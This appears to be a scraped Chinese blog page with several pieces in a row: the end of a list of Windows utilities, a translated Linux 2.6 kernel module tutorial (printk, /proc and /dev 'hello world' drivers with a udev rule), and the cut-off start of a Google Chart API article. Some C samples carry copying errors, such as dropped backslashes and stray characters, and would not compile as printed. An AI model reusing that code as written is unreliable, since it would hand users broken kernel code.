[IIS 6.0 Resource Kit Tools](https://www.microsoft.com/downloads/details.aspx?familyid=56FC92EE-A71A-4C73-B628-ADE629C89499&displaylang=en) – 帮助你设置，保护和管理IIS。

[IIsAdmin.NET](https://www.codeplex.com/iisadmin) – 创建多个IIS站点的定义。

[Internet Explorer 7 Blocker](https://www.microsoft.com/downloads/details.aspx?FamilyId=4516A6F7-5D44-482B-9DBD-869B4A90159C) – 阻止IE7 被安装。（奇怪的工具）

[ImTOO MPEG Encoder](http://www.imtoo.com/mpeg-encoder.html) – 视频格式转换。

[InstallPad](http://installpad.com/) – 让你的程序运行地更快一些。

[Instant C#](http://tangiblesoftwaresolutions.com/) – 把 VB.NET程序 转成C#程序

[JavaRa](https://sourceforge.net/project/downloading.php?groupname=javara&filename=JavaRa.zip&use_mirror=osdn) – 删除好的没有用的Java版本。

[Jaxe](http://jaxe.sourceforge.net/) – 一个免费的 XML 编辑器，并支持 XPath 搜索。

[JKDefrag](http://www.kessels.com/JkDefrag/) – 一个很不错的磁盘碎片整理优化程序。

[Junction Link Magic](http://www.rekenwonder.com/linkmagic.htm) – 创建 junction points（比如我的文档，网上邻居这类的目录）

[jZip](http://www.jzip.com/) – 创建，解压，压缩Zip, TAR, GZip 和7-Zip文件，只能解压 RAR 和ISO文件。

[Launchy](http://www.launchy.net/) – 在你的开始菜单中创建文件，工程，目录和收藏夹等东西。

[Leaf Networks](http://www.leafnetworks.net/) – 创建你自己私有的网络。

[LINQPad](http://www.linqpad.net/) – 一个小工具可以和 SQL databases,，XML data 和object collections 交互。

[MacDrive](http://www.mediafour.com/macdrive) – 在Windows下挂载OS-X HFS/HFS+ 文件系统。

[MagicISO](http://www.magiciso.com/) – 一个强大的 CD/DVD 映像文件 创建/编辑/提取工具。

[MBSA](https://technet.microsoft.com/en-us/security/cc184924.aspx) – 帮你校对并比对你系统目前的系统安全是否是微软推荐的。

[Microsoft Log Parser](https://www.microsoft.com/downloads/details.aspx?FamilyID=890cd06b-abf8-4c25-91b2-f8d975cf8c07&displaylang=en) – 可以读取基于文本的log files，XML 文件或CSV 文件，这些文件一般都是Windows操作系统中各种工具的日志文件，比如事件日志，注册表，性能监视器和活动目录。

[Microsoft PowerShell 2](https://www.microsoft.com/downloads/details.aspx?FamilyID=7c8051c2-9bfc-4c81-859d-0864979fa403&displaylang=en) – Microsoft下一代的命令行shell

[Microsoft RoboCopy](https://en.wikipedia.org/wiki/Robocopy) – 强大的文件拷贝。

[Microsoft SQL Server Database Publishing Wizard 1.1](https://www.microsoft.com/downloads/details.aspx?FamilyId=56E5B1C5-BF17-42E0-A410-371A838E570A&displaylang=en) – 把SQL Sever数据库变成T-SQL 脚本。

[Microsoft SUA for UNIX-based Applications](https://www.microsoft.com/windowsserver2008/en/us/support-unix.aspx) – 和UNIX 互通的组件。

[Mono/GTK#/Moonlight](https://www.mono-project.com/Start) – Linux下的.NET, ASP.NET 和 Silverlight

[Microsoft Virtual CD-ROM Control Panel](https://download.microsoft.com/download/7/b/6/7b6abd84-7841-4978-96f5-bd58df02efa2/winxpvirtualcdcontrolpanel_21.exe) – ISO 文件虚拟光驱。

[Microsoft XML Notepad 2007](https://www.microsoft.com/downloads/details.aspx?familyid=72d6aa49-787d-4118-ba5f-4f30fe913628&displaylang=en) – XML 文件编辑器。

[MyGeneration](http://www.mygenerationsoftware.com/portal/default.aspx) – 代码生成器。

[NAT32 IP Router](http://www.nat32.com/) – 一个外网内网IP转换程序。

[NetShare Manager](http://www.pcmag.com/article2/0,2817,2122550,00.asp) – 组织并控制不同网络的网络共享。

[NetStumbler](http://www.netstumbler.com/) – 网络抓包程序，用于Wi-Fi 网络。

[NetTools](http://users.pandora.be/ahmadi/nettools.htm) – 一个全面的主机监控，网络扫描，安全，管理工具。可能还更多。

[NirTools](https://www.nirsoft.net/utils/index.html) – 一个Windows 工具集。

[NOD32](http://www.joejoesoft.com/cms/showpage.php?cid=97) – 号称是目前最好的防病毒软件。

[NT Toolkit](http://www.netikus.net/products_nttoolkit.html) – 一系例小巧而实用为了网络管理而设计的工具。

[NTP](http://www.meinberg.de/english/sw/ntp.htm) – Windows的网络时间服务程序。

[Object Desktop](http://www.stardock.com/products/odnt/) – 让Windows看起来就是你想要的。

[OpenVPN](https://openvpn.net/) – 全功能的开源 SSL VPN 解决方案。支持远程访问， site-to-site VPNs, Wi-Fi 安全，和企业级的解决方案——比如负载平衡，权限策略等

[Osiris Host Integrity Monitoring](http://osiris.shmoo.com/) – 一个主机监控程序。其可以监控一台或多台主机是否发生了改变，其维护了一个非常细的日志来记录了文件系统，用户，内核模块的改变，以及更多的东西。

[OSSIM](http://www.ossim.net/) – 全称是Open Source Security Information Management，一个提供了全面的工具，这些小工具在一起工作，可让你看到所有主机的网络/物理资源的使用情况。

[Paint.NET](http://www.getpaint.net/) – 一个免费的很简单的图片编辑器。

[PowerGREP](http://www.powergrep.com/) – Windows 下的grep 工具，不但支持文本文件，还支持，二进制文件，压缩文件，WORD文件，EXCEL电子表格，PDF文件等等。（关于grep，这是一个Unix下的扫描文件内容或标准输出，并找到匹配字符串的程序）

[PowerLocker](http://www.powerlocker.com/index_files/PowerLockerPro.htm) – 提供了一个快速简单的方式让你锁住你的PowerShell scripts

[PureText](http://www.stevemiller.net/puretext/) – 任务栏小图标可以移除剪贴板里的文本格式。

[PuTTY](http://www.chiark.greenend.org.uk/~sgtatham/putty/) – 这个不用多说了，鼎鼎大名的免费的Telnet 和SSH客户端程序。

[RegExBuddy](https://www.regexbuddy.com/) – 一个容易创建正规表达式的工具。即简单，也复杂。

[Regulator](https://sourceforge.net/projects/regulator/) – 高级的正则表达式测试工具。并有语法高亮显示和web-service 集成以读取Regexlib.com的在线正则表达式。

[ReSharper](http://www.jetbrains.com/resharper/) – 完全集成于Visual Studio，实时的错误高亮，代码提示，以及单元测试工具。一供有超过30 个高级的代码重构方案，多个代码导航和收搜工具，自动代码生成，和代码模板生成，以及其它更多的功能以配合C#, VB.NET, ASP.NET, XML, 和XAML使用。

[Revo Uninstaller](http://www.revouninstaller.com/) – 反安装，删除程序。以解决反安装中的问题。

[RoboForm](https://www.roboform.com/) – 口令管理，网页表单填写。

[SDC Tasks Library](https://www.codeplex.com/sdctasks) – 超过300 MSBuild 任务。

[SOS](https://blogs.msdn.com/delay/archive/2009/03/11/where-s-your-leak-at-using-windbg-sos-and-gcroot-to-diagnose-a-net-memory-leak.aspx) – WinDbg 扩展，可以让WPF 和Silverlight 程序员使用。

[System Information for Windows](https://www.gtopala.com/) – 收集系统属性和配置的细节信息。并用一种极端的完整的方式显示出来。

[SpywareBlaster](http://www.javacoolsoftware.com/spywareblaster.html) – 阻止你的IE中了基于ActiveX的间谍软件，广告软件，以及流氓软件，或是其它你不想要的软件。

[SmartSniff](https://www.nirsoft.net/utils/smsniff.html) – TCP/IP 抓包程序。

[SnagIt](http://www.techsmith.com/) – 强大的抓屏程序。

[subversion](http://subversion.tigris.org/) – 鼎鼎大名的代码版本控制软件。

[SQL Digger](http://sqldigger.bdsweb.be/) – SQL存过，视图等关键字搜索工具。

[SQLTac](http://www.cabercomputing.com/Products-SqlTac.aspx) – 强大的协助你管理你的Domain Knowledge工具。

[SQLTools](http://www.sqltools.net/) – 免费的Oracle PL/SQL 编辑器。

[SQLyog](http://www.sqlyog.com/) – 免费的MySQL 编辑器。

[StyleCop](https://code.msdn.microsoft.com/sourceanalysis) – 分析C# 源代码，以保成代码风格的一致性。

[SuperAntiSpyware](https://www.superantispyware.com/) – 最牛的反间谍软件扫描器。

[SyncBackPro](http://www.2brightsparks.com/syncback/sbpro.html) – 实时加密，版本备份和同步。

[synergy2](http://synergy2.sourceforge.net/) – 让一个鼠标键盘共享给多个电脑使用。

[SysInternals Suite Live](http://live.sysinternals.com/) – 一个超强的NETBIOS 版本的SysInternals Suite

[Sysinternals Suite](https://technet.microsoft.com/en-us/sysinternals/0e18b180-9b7a-4c49-8120-c47c5a693683.aspx) – 一级超强的高兴系统工具和技术信息。

[SystemRescueCD](http://www.sysresccd.org/) – 可启动的 Linux CD 

[Take Command](http://jpsoft.com/) – 最好的图形Shell。

[TaskPower](http://www.pcmag.com/article2/0,2817,2253746,00.asp) – 查看并分析进程的运行。

[TeamCity](http://www.jetbrains.com/teamcity) – 惊艳的持续综合包。

[TestDisk](https://www.cgsecurity.org/wiki/TestDisk) – 恢复丢失的分区。

[ThreatFire](http://www.threatfire.com/) – 实时的行为分析和间谍软件检测软件。

[TreeSize Free](http://www.jam-software.com/software.html) – 告诉你为什么宝贵的磁盘空间到哪里去了。

[Trillian](http://www.ceruleanstudios.com/) – 多人网络聊天工具。

[TrueCrypt](http://www.truecrypt.org/) – 免费的开源的磁盘加密软件，可用于Windows Vista/XP, Mac OS X, 和Linux

[Tunnelier](http://www.bitvise.com/tunnelier) – SSH 和SFTP 客户端。

[TweakUI](https://www.microsoft.com/windowsxp/downloads/powertoys/xppowertoys.mspx) – 可以修正一些惹人烦的关于Windows UI的小软件。

[UltraEdit](http://www.ultraedit.com/) – Text, hex, HTML, PHP, Java, Javascript, Perl, 等等，一个强大的编辑器。

[UltraMon](http://www.realtimesoft.com/ultramon/) – 多显示器工具。

[Undelete Plus](http://www.undelete-plus.com/) – 恢复被删除的文件。

[Unlocker](http://ccollomb.free.fr/unlocker/) – 有些时候，一些文件被一些进程占着我们无法删除，这个程序就是把这些被锁住的文件解锁。

[Unstoppable Copier](http://www.roadkil.net/program.php?ProgramID=29) – 恢复被物理损坏的硬盘上的文件。允许你从一些坏磁道上把文件备份下来。

[uTorrent](https://www.utorrent.com/) – BitTorrent 客户端。

[Vista 64-bit Codecs](http://shark007.net/) – Windows Vista 64-bit下的音频和视频解码器。

[VisualSVN](http://www.visualsvn.com/) – 为了Microsoft Visual Studio开发的专业的Subversion 集成程序

[VirtuaWin](http://virtuawin.sourceforge.net/) – 虚拟桌面。

[VLC Media Player](https://www.videolan.org/vlc/) – 免费的音频和视频播放器。

[vLite](http://www.vlite.net/) – 一个可以定制Windows Vista 安装的小工具。

[VMware Server](https://www.vmware.com/download/server/) – 在一台机器上运行多个操作系统。

[Weblog Expert](http://www.weblogexpert.com/) – 快速和强大的网站访问log 分析和报告。

[WinDbg](https://www.microsoft.com/whdc/devtools/debugging/default.mspx) – 低层的Windows程序调试工具。

[WinHTTrack](http://www.httrack.com/) – 网页拷贝。

[Windows NT 4.0 Resource Kit](https://www.microsoft.com/downloads/details.aspx?FamilyID=3E972E9A-E08A-49A2-9D3A-C0519479E85A&displaylang=en) – 老了但可能还是有用的Windows NT 4.0 工具

[Windows 2000 Resource Kit](https://support.microsoft.com/kb/927229) – Windows 2000 工具集

[Windows 2003 Resource Kit](https://www.microsoft.com/downloads/details.aspx?familyid=9D467A69-57FF-4AE7-96EE-B18C4790CFFD&displaylang=en) – Windows 2003 工具集

[Windows 2003 Support Tools](https://www.microsoft.com/downloads/details.aspx?FamilyID=96a35011-fd83-419d-939b-9a772ea2df90&displaylang=en) – Windows 2003 管理工具集

[WinDirStat](http://windirstat.info/) – 磁盘使用统计和清楚工具。

[WinSSHD](http://www.bitvise.com/winsshd) – SSH 服务程序。

[WireShark](https://www.wireshark.org/) – 强大的网络协义抓包分析器。

[zFTPServer Suite](http://www.zftpserver.com/) – FTP 服务程序，以及强大的SSL 加密安全认证。

（如有不足，请补充）

# LINUX设备驱动HELLO WORLD程序介绍

by Valerie Henson
07/05/2007

(**译者注：本文的例子是只能在linux的2.6内核下使用的，2.6以上的内核，译者没有做过实验，2.4是要修改make文件才能运行**。)

本文的出处：[这里](http://www.linuxdevcenter.com/pub/a/linux/2007/07/05/devhelloworld-a-simple-introduction-to-device-drivers-under-linux.html?page=1)

自古以来，学习一门新编程语言的第一步就是写一个打印“hello world”的程序（可以看[《hello world 集中营》](https://coolshell.cn/articles/169.html)这个帖子供罗列了300个“hello world”程序例子）在本文中，我们将用同样的方式学习如何编写一个简单的linux内核模块和设备驱动程序。我将学习到如何在内核模式下以三种不同的方式来打印hello world，这三种方式分别是： printk()，/proc文件，/dev下的设备文件。

目录



[准备：安装内核模块的编译环境](https://coolshell.cn/articles/566.html#准备：安装内核模块的编译环境)[使用printk()函数打印”Hello World”](https://coolshell.cn/articles/566.html#使用printk函数打印Hello_World)[使用/proc的Hello, World!](https://coolshell.cn/articles/566.html#使用proc的Hello_World)[Hello, World! 使用 /dev/hello_world](https://coolshell.cn/articles/566.html#Hello_World_使用_devhello_world)

#### 准备：安装内核模块的编译环境

一个内核模块kernel module是一段能被内核动态加载和卸载的内核代码，因为内核模块程序是内核的一个部分，并且和内核紧密的交互，所以内核模块不可能脱离内核编译环境，至少，它需要内核的头文件和用于加载的配置信息。编译内核模块同样需要相关的开发工具，比如说编译器。为了简化，本文只简要讨论如何在Debian、Fedora和其他以.tar.gz形式提供的原版linux内核下进行核模块的编译。在这种情况下，你必须根据你正在运行内核相对应的内核源代码来编译你的内核模块kernel module(当你的内核模块一旦被装载到你内核中时，内核就将执行该模块的代码)



必须要注意内核源代码的位置，权限：内核程序通常在/usr/src/linux目录下，并且属主是root。如今，推荐的方式是将内核程序放在一个非root用户的home目录下。本文中所有命令都运行在非root的用户下，只有在必要的时候，才使用sudo来获得临时的root权限。配置和使用sudo可以man sudo(8) visudo(8) 和sudoers(5)。或者切换到root用户下执行相关的命令。不管什么方式，你都需要root权限才能执行本文中的一些命令。

在Debian下编译内核模块的准备

使用如下的命令安装和配置用于在Debian编译内核模块的module-assitant包



```
$ sudo apt-get install module-assistant
```



以此你就可以开始编译内核模块，你可以在[《Debian Linux Kernel Handbook》](http://kernel-handbook.alioth.debian.org/)这本书中找到对Debian内核相关任务的更深度的讨论。

Fedora的kernel-devel包包含了你编译Fedora内核模块的所有必要内核头文件和工具。你可以通过如下命令得到这个包。

```
$ sudo yum install kernel-devel
```

有了这个包，你就可以编译你的内核模块kernel modules。关于Fedora编译内核模块的相关文档你可以从[Fedora release notes](https://docs.fedoraproject.org/release-notes/fc6/en_US/sn-Kernel.html#id2950723)中找到。

一般Linux 内核源代码和配置

(译者注，下面的编译很复杂，如果你的Linux不是上面的系统，你可以使用REHL AS4系统，这个系统的内核就是2.6的内核，并且可以通过安装直接安装内核编译支持环境，从而就省下了如下的步骤。而且下面的步骤比较复杂，建议在虚拟机安装Linux进行实验。)

如果你选择使用一般的Linux内核源代吗，你必须，配置，编译，安装和重启的你编译内核。这个过程非常复杂，并且本文只会讨论使用一般内核源代码的基本概念。

linux的著名的内核源代码在http://kernel.org上都可以找到。最近新发布的稳定版本的代码在首页上。下载全版本的源代码，不要下载补丁代码。例如，当前发布稳定版本在url: http://kernel.org/pub/linux/kernel/v2.6/linux-2.6.21.5.tar.bz2上。如果需要更快速的下载，从htpp://kernel.org/mirrors上找到最近的镜像进行下载。最简单获得源代码的方式是以断点续传的方式使用wget。如今的http很少发生中断，但是如果你在下载过程中发生了中断，这个命令将帮助你继续下载剩下的部分。

```
$ wget -c http://kernel.org/pub/linux/kernel/v2.6/linux-2.6.21.5.tar.bz2
```

解包内核源代码

```
$ tar xjvf linux-<version>.tar.bz2
```

现在你的内核源代码位于linux-/目录下。转到这个目录下，并配置它：



```
$ cd linux-<version>
$ make menuconfig
```



一些非常易用的编译目标make targets提供了多种编译安装内核的形式：Debian 包，RPM包，gzip后的tar文件 等等，使用如下命令查看所有可以编译的目标形式

```
$ make help
```

一个可以工作在任何linux的目标是：(译者注：REHL AS4上没有tar-pkg这个目标，你可以任选一个rpm编译，编译完后再上层目录可以看到有一个linux-.tar.gz可以使用)

```
$ make tar-pkg
```

当编译完成后，可以调用如下命令安装你的内核

```
$ sudo tar -C / -xvf linux-<version>.tar
```

在标准位置建立的到内核源代码的链接

```
$ sudo ln -s <location of top-level source directory> /lib/modules/'uname -r'/build
```

现在已经内核源代码已经可以用于编译内核模块了，重启你的机器以使得你根据新内核程序编译的内核可以被装载。

#### 使用printk()函数打印”Hello World”

我们的第一个内核模块，我们将以一个在内核中使用函数printk()打印”Hello world”的内核模块为开始。printk是内核中的printf函数。printk的输出打印在内核的消息缓存kernel message buffer并拷贝到/var/log/messages(关于拷贝的变化依赖于如何配置syslogd)

下载[hello_printk](http://www.linuxdevcenter.com/linux/2007/07/05/examples/hello_printk.tar.gz) 模块的tar包 并解包：

```
$ tar xzvf hello_printk.tar.gz
```

这个包中包含两个文件:Makefile，里面包含如何创建内核模块的指令和一个包含内核模块源代码的hello_printk.c文件。首先，我们将简要的过一下这个Makefile 文件。

```
obj-m := hello_printk.o
```

obj-m指出将要编译成的内核模块列表。.o格式文件会自动地有相应的.c文件生成(不需要显示的罗列所有源代码文件)



```
KDIR  := /lib/modules/$(shell uname -r)/build
```



KDIR表示是内核源代码的位置。在当前标准情况是链接到包含着正在使用内核对应源代码的目录树位置。



```
PWD := $(shell pwd)
```



PWD指示了当前工作目录并且是我们自己内核模块的源代码位置



```
default:
     $(MAKE) -C $(KDIR) M=$(PWD) modules
```



default是默认的编译连接目标；即，make将默认执行本条规则编译目标，除非程序员显示的指明编译其他目标。这里的的编译规则的意思是，在包含内核源代码位置的地方进行make,然后之编译$(PWD)(当前)目录下的modules。这里允许我们使用所有定义在内核源代码树下的所有规则来编译我们的内核模块。

现在我们来看看hello_printk.c这个文件



```
#include
	<linux/init.h>
#include
	<linux/module.h>
```



这里包含了内核提供的所有内核模块都需要的头文件。这个文件中包含了类似module_init()宏的定义，这个宏稍后我们将用到



```
static int __init
hello_init(void){
    printk("Hello, world!n");
    return 0;
}
```



这是内核模块的初始化函数，这个函数在内核模块初始化被装载的时候调用。__init关键字告诉内核这个代码只会被运行一次，而且是在内核装载的时候。printk()函数这一行将打印一个”Hello, world”到内核消息缓存。printk参数的形式在大多数情况和printf(3)一模一样。



```
module_init(hello_init); 
module_init()
```



宏告诉内核当内核模块第一次运行时哪一个函数将被运行。任何在内核模块中其他部分都会受到内核模块初始化函数的影响。



```
static void __exit
hello_exit(void){
    printk("Goodbye, world!n");
}
module_exit(hello_exit);
```



同样地，退出函数也只在内核模块被卸载的时候会运行一次，module_exit()宏标示了退出函数。__exit关键字告诉内核这段代码只在内核模块被卸载的时候运行一次。



```
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Valerie Henson val@nmt.edu");
MODULE_DESCRIPTION("Hello, world!" minimal module");
MODULE_VERSION("printk");
MODULE_LICENSE()
```



宏告诉内核，内核模块代码在什么样的license之下，这将影响主那些符号(函数和变量，等等)可以访问主内核。GPLv2 下的模块(如同本例子中)能访问所有的符号。某些内核模块license将会损害内核开源的特性，这些license指示内核将装载一些非公开或不受信的代码。如果内核模块不使用MODULE_LICENSE()宏，就被假定为非GPLv2的，这会损害内核的开源特性，并且大部分Linux内核开发人员都会忽略来自受损内核的bug报告，因为他们无法访问所有的源代码，这使得调试变得更加困难。剩下的MODULE_*()这些宏以标准格式提供有用的标示该内核模块的信息(译者注：这里意思是，你必须使用GPLv2的license，否则你的驱动程序很有可能得不到Linux社区的开发者的支持 ：）)

现在，开始编译和运行代码。转到相应的目录下，编译内核模块



```
$ cd hello_printk  
$ make
```



接着，装载内核模块，使用insmod指令，并且通过dmesg来检查打印出的信息，dmesg是打印内核消息缓存的程序。



```
$ sudo insmod ./hello_printk.ko  
$ dmesg | tail
```



你将从dmesg的屏幕输出中看见”Hello world!”信息。现在卸载使用rmmod卸载内核模块，并检查退出信息。



```
$ sudo rmmod hello_printk  
$ dmesg | tail
```



到此，你就成功地完成了对内核模块的编译和安装！

#### 使用/proc的Hello, World!

一种用户程序和内核通讯最简单和流行的方式是通过使用/proc下文件系统进行通讯。/proc是一个伪文件系统，从这里的文件读取的数据是由内核返回的数据，并且写入到这里面的数据将会被内核读取和处理。在使用/proc方式之前，所用用户和内核之间的通讯都不得不使用系统调用来完成。使用系统调用意味着你将在要在查找已经具有你需要的行为方式的系统调用(一般不会出现这种情况)，或者创建一种新的系统调用来满足你的需求(这样就要求对内核全局做修改，并增加系统调用的数量，这是通常是非常不好的做法)，或者使用ioctl这个万能系统调用，这就要求要创建一个新文件类型供ioctl操作(这也是非常复杂而且bug比较多的方式，同样是非常繁琐的)。/proc提供了一个简单的，无需定义的方式在用户空间和内核之间传递数据，这种方式不仅可以满足内核使用，同样也提供足够的自由度给内核模块做他们需要做的事情。

为了满足我们的要求，我们需要当我们读在/proc下的某一个文件时将会返回一个“Hello world!”。我们将使用/proc/hello_world这个文件。下载并解开[hello proc](http://www.linuxdevcenter.com/linux/2007/07/05/examples/hello_proc.tar.gz)这个gzip的tar包后，我们将首先来看一下[hello_proc.c](http://www.linuxdevcenter.com/linux/2007/07/05/examples/hello_proc.c)这个文件



```
#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
```



这次，我们将增加一个proc_fs头文件，这个头文件包括驱动注册到/proc文件系统的支持。当另外一个进程调用read()时，下一个函数将会被调用。这个函数的实现比一个完整的普通内核驱动的read系统调用实现要简单的多，因为我们仅做了让”Hello world”这个字符串缓存被一次读完。



```
static int
hello_read_proc(char *buffer, char **start,off_t offset,
                int size, int *eof, void *data)
{
```



这个函数的参数值得明确的解释一下。buffer是指向内核缓存的指针，我们将把read输出的内容写到这个buffer中。start参数多用更复杂的/proc文件；我们在这里将忽略这个参数；并且我只明确的允许offset这个的值为0。size是指buffer中包含多字节数；我们必须检查这个参数已避免出现内存越界的情况，eof参数一个EOF的简写，用于返回文件是否已经读到结束，而不需要通过调用read返回0来判断文件是否结束。这里我们不讨论依靠更复杂的/proc文件传输数据的方法。这个函数方法体罗列如下：



```
    char *hello_str = "Hello, world!\n";
    int len = strlen(hello_str); /* Don't include the null byte. */
    /*     * We only support reading the whole string at once.     */
    if (size < len)
        return< -EINVAL;
    /*     * If file position is non-zero, then assume the string has
    * been read and indicate there is no more data to be read.
    */
    if (offset != 0)
        return 0;
    /*     * We know the buffer is big enough to hold the string.     */
    strcpy(buffer, hello_str);
    /*     * Signal EOF.     */
    *eof = 1;
    return len;
}
```



下面，我们需将内核模块在初始化函数注册在/proc 子系统中。



```
static int __init
hello_init(void){
    /*
    * Create an entry in /proc named "hello_world" that calls
    * hello_read_proc() when the file is read.
    */
    if (create_proc_read_entry("hello_world", 0, 
                        NULL, hello_read_proc, NULL) == 0) {
        printk(KERN_ERR
        "Unable to register "Hello, world!" proc filen");
        return -ENOMEM;
    }
    return 0;
}
module_init(hello_init);
```



当内核模块卸载时，需要在/proc移出注册的信息(如果我们不这样做的，当一个进程试图去访问/proc/hello_world，/proc文件系统将会试着执行一个已经不存在的功能，这样将会导致内核崩溃)



```
static void __exit
hello_exit(void){
    remove_proc_entry("hello_world", NULL);
}
module_exit(hello_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Valerie Henson val@nmt.edu");
MODULE_DESCRIPTION(""Hello, world!" minimal module");
MODULE_VERSION("proc");
```



下面我们将准备编译和装载模组



```
$ cd hello_proc  
$ make  
$ sudo insmod ./hello_proc.ko
```



现在，将会有一个称为/proc/hello_world的文件，并且读这个文件的，将会返回一个”Hello world”字符串。



```
$ cat /proc/hello_world
Hello, world!
```



你可以为为同一个驱动程序创建多个/proc文件，并增加相应写/proc文件的函数，创建包含多个/proc文件的目录，或者更多的其他操作。如果要写比这个更复杂的驱动程序，可以使用seq_file函数集来编写是更安全和容易的。关于这些更多的信息可以看[《Driver porting: The seq_file interface》](https://lwn.net/Articles/22355/)

#### Hello, World! 使用 /dev/hello_world

现在我们将使用在/dev目录下的一个设备文件/dev/hello_world实现”Hello,world!” 。追述以前的日子，设备文件是通过MAKEDEV脚本调用mknod命令在/dev目录下产生的一个特定的文件，这个文件和设备是否运行在改机器上无关。到后来设备文件使用了devfs，devfs在设备第一被访问的时候创建/dev文件，这样将会导致很多有趣的加锁问题和多次打开设备文件的检查设备是否存在的重试问题。当前的/dev版本支持被称为udev，因为他将在用户程序空间创建到/dev的符号连接。当内核模块注册设备时，他们将出现在sysfs文件系统中，并mount在/sys下。一个用户空间的程序，udev,注意到/sys下的改变将会根据在/etc/udev/下的一些规则在/dev下创建相关的文件项。

下载[hello world](http://www.linuxdevcenter.com/linux/2007/07/05/examples/hello_dev.tar.gz)内核模块的gzip的tar包，我们将开始先看一下hello_dev.c这个源文件。



```
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/miscdevice.h>
#include <linux/module.h>
#include <asm/uaccess.h>
```



正如我们看到的必须的头文件外，创建一个新设备还需要更多的内核头文件支持。fs.sh包含所有文件操作的结构，这些结构将由设备驱动程序来填值，并关联到我们相关的/dev文件。miscdevice.h头文件包含了对通用miscellaneous设备文件注册的支持。 asm/uaccess.h包含了测试我们是否违背访问权限读写用户内存空间的函数。hello_read将在其他进程在/dev/hello调用read()函数被调用的是一个函数。他将输出”Hello world!”到由read()传入的缓存。



```
static ssize_t hello_read(struct file * file, char * buf, size_t count, loff_t *ppos)
{
    char *hello_str = "Hello, world!n";
    int len = strlen(hello_str); /* Don't include the null byte. */
    /*     * We only support reading the whole string at once.     */
    if (count < len)
        return -EINVAL;
    /*
    * If file position is non-zero, then assume the string has
    * been read and indicate there is no more data to be read.
    */
    if (*ppos != 0)
        return 0;
    /*
    * Besides copying the string to the user provided buffer,
    * this function also checks that the user has permission to
    * write to the buffer, that it is mapped, etc.
    */
    if (copy_to_user(buf, hello_str, len))
        return -EINVAL;
    /*
    * Tell the user how much data we wrote.
    */
    *ppos = len;
    return len;
}
```



下一步，我们创建一个文件操作结构file operations struct，并用这个结构来定义当文件被访问时执行什么动作。在我们的例子中我们唯一关注的文件操作就是read。



```
static const struct file_operations hello_fops = {
    .owner        = THIS_MODULE,
    .read        = hello_read,
};
```



现在，我们将创建一个结构，这个结构包含有用于在内核注册一个通用miscellaneous驱动程序的信息。



```
static struct miscdevice hello_dev = {
    /*
    * We don't care what minor number we end up with, so tell the
    * kernel to just pick one.
    */
    MISC_DYNAMIC_MINOR,
    /*     
    * Name ourselves /dev/hello.     
    */
    "hello",
    /*     
    * What functions to call when a program performs file
    * operations on the device.
    */
    &hello_fops
};
```



在通常情况下，我们在init中注册设备



```
static int __init
hello_init(void){
    int ret;
    /*
    * Create the "hello" device in the /sys/class/misc directory.
    * Udev will automatically create the /dev/hello device using
    * the default rules.
    */
    ret = misc_register(&hello_dev);
    if (ret)
        printk(KERN_ERR
            "Unable to register "Hello, world!" misc devicen");
    return ret;
}
module_init(hello_init);
```



接下是在卸载时的退出函数



```
static void __exit
hello_exit(void){
    misc_deregister(&hello_dev);
}
module_exit(hello_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Valerie Henson val@nmt.edu>");
MODULE_DESCRIPTION(""Hello, world!" minimal module");
MODULE_VERSION("dev");
```



编译并加载模块:



```
$ cd hello_dev  
$ make  
$ sudo insmod ./hello_dev.ko
```



现在我们将有一个称为/dev/hello的设备文件，并且这个设备文件被root访问时将会产生一个”Hello, world!”



```
$ sudo cat /dev/hello
 Hello, world!
 
```



但是我们不能使用普通用户访问他:



```
$ cat /dev/hello 
cat:/dev/hello: Permission denied  

$ ls -l 
/dev/hello crw-rw---- 1 root root 10, 61 2007-06-20 14:31 /dev/hello
```



这是有默认的udev规则导致的，这个条规将标明当一个普通设备出现时，他的名字将会是/dev/，并且默认的访问权限是0660(用户和组读写访问，其他用户无法访问)。我们在真实情况中可能会希望创建一个被普通用户访问的设备驱动程序，并且给这个设备起一个相应的连接名。为达到这个目的，我们将编写一条udev规则。

udev规则必须做两件事情：第一创建一个符号连接，第二修改设备的访问权限。

下面这条规则可以达到这个目的：

```
KERNEL=="hello", SYMLINK+="hello_world", MODE="0444"
```

我们将详细的分解这条规则，并解释每一个部分。KERNEL==”hello” 标示下面的的规则将作用于/sys中设备名字”hello”的设备(==是比较符)。hello 设备是我们通过调用misc_register()并传递了一个包含设备名为”hello”的文件操作结构file_operations为参数而达到的。你可以自己通过如下的命令在/sys下查看



```
$ ls -d /sys/class/misc/hello//sys/class/misc/hello/
```



SYMLINK+=”hello_world” 的意思是在符号链接列表中增加 (+= 符号的意思着追加)一个hello_world ，这个符号连接在设备出现时创建。在我们场景下，我们知道我们的列表的中的只有这个符号连接，但是其他设备驱动程序可能会存在多个不同的符号连接，因此使用将设备追加入到符号列表中，而不是覆盖列表将会是更好的实践中的做法。

MODE=”0444″的意思是原始的设备的访问权限是0444,这个权限允许用户，组，和其他用户可以访问。

通常，使用正确的操作符号(==, +=, or =)是非常重要的，否则将会出现不可预知的情况。

现在我们理解这个规则是怎么工作的，让我们将其安装在/etc/udev目录下。udev规则文件以和System V初始脚本目录命名的同种方式的目录下，/etc/udeve/rules.d这个目录，并以字母/数字的顺序。和System V的初始化脚本一样，/etc/udev/rules.d下的目录通常符号连接到真正的文件，通过使用符号连接名，将使得规则文件已正确的次序得到执行。
使用如下的命令，拷贝hello.rules文件从/hello_dev目录到/etc/udev目录下，并创建一一个最先被执行的规则文件链接在/etc/udev/rules.d目录下。



```
$ sudo cp hello.rules /etc/udev/  
$ sudo ln -s ../hello.rules /etc/udev/rules.d/010_hello.rules
```



现在我们重新装载驱动程序，并观察新的驱动程序项



```
$ sudo rmmod hello_dev  
$ sudo insmod ./hello_dev.ko  
$ ls -l /dev/hello*  
cr--r--r-- 1 root root 10, 61 2007-06-19 21:21 /dev/hello  
lrwxrwxrwx 1 root root      5 2007-06-19 21:21 /dev/hello_world -> hello
```



最后，检查你可以使用普通用户访问/dev/hello_world设备.



```
$ cat /dev/hello_world
Hello, world!  

$ cat /dev/hello
Hello, world!
```



更多编写udev规则的信息可以在Daniel Drake的文章[Writing udev rules](http://www.reactivated.net/writing_udev_rules.html)中找到。

# 使用GOOGLE API做统计图

Google提供了一个的统计图的API。你可以通过构造一个URL链接来获得Google提供的统计图方案。

比如：如果我们使用如下链接：

```
